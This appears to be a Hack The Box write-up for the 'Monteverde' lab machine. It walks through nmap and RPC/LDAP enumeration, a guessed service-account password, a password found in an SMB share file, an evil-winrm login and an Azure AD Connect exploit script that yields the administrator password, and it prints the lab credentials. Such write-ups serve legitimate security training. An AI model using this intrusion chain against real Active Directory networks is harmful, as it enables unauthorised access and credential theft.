# Monteverde
## NMap
`nmap -A -T5 -p- 10.10.10.172`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-24 14:46 CET
Nmap scan report for 10.10.10.172
Host is up (0.054s latency).
Not shown: 65518 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-24 13:01:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49775/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/24%Time=5E7A0FEC%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Timing level 5 (Insane) used
No OS matches for host
Network Distance: 2 hops
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -48m05s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-24T13:03:52
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   53.68 ms 10.10.14.1
2   54.11 ms 10.10.10.172

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 434.17 seconds
```

`nmap -n -sV --script "ldap*" -p 389 monteverde.htb` -> result [here][2]


## Enumerating RPC

`rpcdump.py 10.10.10.172 -p 135 > rpcdump.log`

`rpcclient -W workgroup -c querydispinfo -U '' -N monteverde.htb`

```
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)
```
## GetADUSer Impacket

`GetADUsers.py -all megabank.local/ -dc-ip 10.10.10.172`

```
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Querying 10.10.10.172 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Guest                                                 <never>              <never>             
AAD_987d7f2f57d2                                      2020-01-02 23:53:24.984897  2020-03-24 06:18:32.499762 
mhope                                                 2020-01-03 00:40:05.908924  2020-03-24 14:42:29.953052 
SABatchJobs                                           2020-01-03 13:48:46.392235  2020-03-24 12:19:19.202876 
svc-ata                                               2020-01-03 13:58:31.332169  <never>             
svc-bexec                                             2020-01-03 13:59:55.863422  <never>             
svc-netapp                                            2020-01-03 14:01:42.786264  <never>             
dgalanos                                              2020-01-03 14:06:10.519660  <never>             
roleary                                               2020-01-03 14:08:05.832167  <never>             
smorgan                                               2020-01-03 14:09:21.629084  <never>             
```
***SABatchJobs:SABatchJobs*** can log via smb

## Smbclient

`smbclient -L //10.10.10.172 -U SABatchJobs`

`smbclient //10.10.10.172/users$ -U SABatchJobs`

inside Directory mhope there is a file [azure.xml][3] containing a password

***mhope:4n0therD4y@n0th3r$***

## Evil win

`ruby evil-winrm.rb -i monteverde.htb -u mhope -p 4n0therD4y@n0th3r\$`

## Azure exploit
Run [a.ps1][1]
***administrator:d0m@in4dminyeah!*** login via evil win 

[#]://
[1]: a.ps1
[2]: nmap-ldap.txt
[3]: azure.xml

![htbbadge](https://www.hackthebox.eu/badge/image/272787)
